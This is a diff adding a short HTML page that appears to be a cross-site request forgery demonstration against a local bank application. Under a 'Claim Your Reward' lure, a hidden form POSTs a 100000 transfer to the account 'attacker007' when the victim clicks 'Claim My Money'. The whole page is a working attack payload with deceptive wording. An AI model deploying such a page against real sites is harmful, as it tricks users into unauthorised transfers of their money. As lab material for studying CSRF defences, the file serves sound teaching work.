@@ -1,0 +1,14 @@
+<html>
+<body>
+  <h1>Click Below to Claim Your Reward!</h1>
+
+  <form action="http://localhost:8080/bank/transfer" method="POST" id="hackForm">
+      <input type="hidden" name="toAccount" value="attacker007" />
+      <input type="hidden" name="amount" value="100000" />
+      <button type="button" onclick="document.getElementById('hackForm').submit()">
+        Claim My Money
+      </button>
+  </form>
+
+</body>
+</html>
